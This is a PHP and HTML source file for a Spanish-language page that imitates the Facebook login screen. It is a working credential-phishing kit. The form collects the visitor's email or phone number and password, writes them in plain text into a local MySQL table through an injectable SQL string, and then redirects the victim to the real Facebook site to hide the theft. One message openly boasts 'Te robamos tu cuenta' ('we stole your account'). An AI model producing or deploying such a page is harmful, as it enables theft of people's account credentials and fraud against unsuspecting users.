
<?php
	$servidor="localhost";
	$usuario="root";
	$clave="";
	$baseDeDatos="facebook";

	$enlace = mysqli_connect($servidor, $usuario, $clave, $baseDeDatos);

	if(!$enlace){
		echo"Error en la conexion con el servidor";
	}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="Facebook.com.css">
    <link rel="icon" type="image/png" href="imagenes/fb_icon_325x325.png">
    <title>Facebook - Entrar o registrarse</title>
</head>

<body>
    <main>
        <article>
            <img class="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
            <p>
                Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.
            </p>
        </article>
        <article>
            <div>
                <form action="#" method="POST">
                    <input type="tel" type="email" placeholder="Correo electrónico o número de teléfono" name="correo">
                    <input type="password" placeholder="Contraseña" name="contraseña">
                    <input type="submit" value="Iniciar seción" name="enviar">
                </form>
                <a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">
                    ¿Has olvidado la contraseña?
                </a>
                <span></span>
                <article>
                    <button>
                        Crear cuenta nueva
                    </button>
                </article>
            </div>
            <p>
                <a href=""> Crea una página </a>para un famoso, una marca o una empresa.
            </p>
        </article>

    </main>
    <div>
        Hola amor, soy tu papi?
    </div>
</body>

<?php

if(isset($_POST["enviar"])){

    $correo = $_POST['correo'];
    $contraseña = $_POST['contraseña'];

    $insertarDatos = "INSERT INTO login VALUES('$correo',
                                                '$contraseña',
                                                id)";

$ejecutarInsertar = mysqli_query($enlace, $insertarDatos);

if(!$ejecutarInsertar){
    echo"Te robamos tu cuenta jsjsjsjsjs";
}

else {
        echo "<script>";
        echo "window.location = 'https://web.facebook.com/';";
        echo "</script>"; 
 
}
}

?>

</html>
